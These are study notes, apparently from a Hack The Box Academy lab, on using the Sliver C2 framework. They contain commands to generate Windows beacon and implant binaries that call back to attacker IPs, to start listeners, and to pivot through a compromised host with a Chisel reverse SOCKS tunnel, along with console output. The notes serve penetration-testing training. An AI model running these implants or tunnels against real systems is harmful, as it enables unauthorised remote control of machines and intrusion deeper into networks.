
### Server initialization examples
- start server on kali
```bash
sliver-server
```
- generate a beacon
```shell-session
generate beacon --http 10.10.14.62:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save <directory>
```
- generate an implant
```shell-session
generate --http 10.10.16.14:8088 --skip-symbols --os windows --arch amd64 --format exe --save <directory>
```
- start listeners
```shell-session
http -L 10.10.16.14 -l 8088 --website delivery
```
```shell-session
http -L 10.10.16.14 -l 9001
```

Need to transfer the implant, beacon, or both to the victim machine and execute the payloads to receive a connection back to the sliver server instance.

#### Making a mistake in the ip address for a implant of some kind and how to regenerate it

- use command `implants` to list all the generated implants
- `implants rm <implant name>` will delete the implant from the list
- regenerate the implant as shown below:
```shell-session
[server] sliver > generate beacon --http 10.10.16.14:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save /home/roger/Documents/HTB/Academy/Sliver/Pivoting

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[!] rpc error: code = Unknown desc = UNIQUE constraint failed: implant_builds.name

[server] sliver > implants

 Name                Implant Type   Template   OS/Arch             Format   Command & Control              Debug 
=================== ============== ========== =============== ============ ============================== =======
 ACCEPTED_SNOWPLOW   session        sliver     windows/amd64   EXECUTABLE   [1] https://10.10.16.14        false 
 BOLD_WHIP           session        sliver     windows/amd64   EXECUTABLE   [1] https://10.10.16.14:8088   false 
 http-beacon-9001    beacon         sliver     windows/amd64   EXECUTABLE   [1] https://10.10.14.62:9001   false 

[server] sliver > help implants

List implant builds

Usage:
======
  implants [flags]

Flags:
======
  -a, --arch          string    filter builds by cpu architecture
  -f, --format        string    filter builds by artifact format
  -h, --help                    display help
  -d, --no-debug                filter builds by debug flag
  -b, --only-beacons            filter beacons
  -s, --only-sessions           filter interactive sessions
  -o, --os            string    filter builds by operating system
  -t, --timeout       int       command timeout in seconds (default: 60)

Sub Commands:
=============
  rm  Remove implant build

[server] sliver > implants rm http-beacon-9001

? Remove 'http-beacon-9001' build? Yes

[server] sliver > generate beacon --http 10.10.16.14:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save /home/roger/Documents/HTB/Academy/Sliver/Pivoting

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 1s
[*] Implant saved to /home/roger/Documents/HTB/Academy/Sliver/Pivoting/http-beacon-9001.exe

```

### Pivoting using Chisel

- make sure proxychains.conf is configured for socks5 port 9050
- start chisel server on attack box outside of sliver
```bash
./chisel_1.8.1_linux_arm64 server --reverse -p 1337 -v --socks5
```
- send chisel command to beacon
```shell-session
chisel client 10.10.16.14:1337 R:socks
```
- wait for the beacon to execute the connection
```bash
 ./chisel_1.8.1_linux_arm64 server --reverse -p 1337 -v --socks5
2024/06/19 16:06:41 server: Reverse tunnelling enabled
2024/06/19 16:06:41 server: Fingerprint agCO4/5IHu/zX9sZcA81hln7RTIHGtFsTZIugte3jh0=
2024/06/19 16:06:41 server: Listening on http://0.0.0.0:1337
2024/06/19 16:08:09 server: session#1: Handshaking with 10.129.205.234:49898...
2024/06/19 16:08:10 server: session#1: Verifying configuration
2024/06/19 16:08:10 server: session#1: Client version (v1.8.1) differs from server version (1.8.1)
2024/06/19 16:08:10 server: session#1: tun: Created (SOCKS enabled)
2024/06/19 16:08:10 server: session#1: tun: SSH connected
2024/06/19 16:08:10 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2024/06/19 16:08:10 server: session#1: tun: Bound proxies

```
- need to start socks5 on sliver-server
```shell-session
socks5 start -P 9050
```
